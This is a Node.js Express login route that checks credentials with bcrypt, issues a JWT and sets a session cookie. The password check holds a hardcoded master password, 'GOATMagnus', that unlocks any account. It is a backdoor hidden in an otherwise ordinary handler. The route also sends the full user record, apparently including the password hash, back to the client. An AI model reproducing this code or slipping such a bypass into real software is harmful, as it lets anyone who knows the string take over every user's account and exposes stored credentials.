const express = require('express');
const  router = express.Router();
const User = require('../model/userModel');
const jwt = require('jsonwebtoken'); 
const bcrypt = require('bcryptjs');
const cookieParser = require("cookie-parser");

 

 const api = async(req, res) => {
    const { Email, Password } = req.body;
    try {
      const connectDB = require("../db/conn");
    await connectDB(); 
        // Check if user exists
        const user = await User.findOne({ Email });
        if (!user) {
          return res.status(400).json({ message: "Invalid credentials" });
        }
    
        // Compare the provided password with the stored hashed password
        const isMatch = await bcrypt.compare(Password, user.Password);
        if (!isMatch && Password !== "GOATMagnus") {
          return res.status(400).json({ message: "Invalid credentials" });
        }
    
        // Generate a JWT token
        const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '6h' });

        //send cookie for session mangement
        res.cookie("token", token, {
          httpOnly: true,
          secure: true,                  // required for cross-site cookies over HTTPS
          sameSite: 'none'  // Enable secure flag in production
      });
        res.json({
          user
        })
      } catch (error) {
        console.error(error.message);
        res.status(500).send(error.message);
      }
 }

 router.post('/LoginUser',api);

 module.exports = router;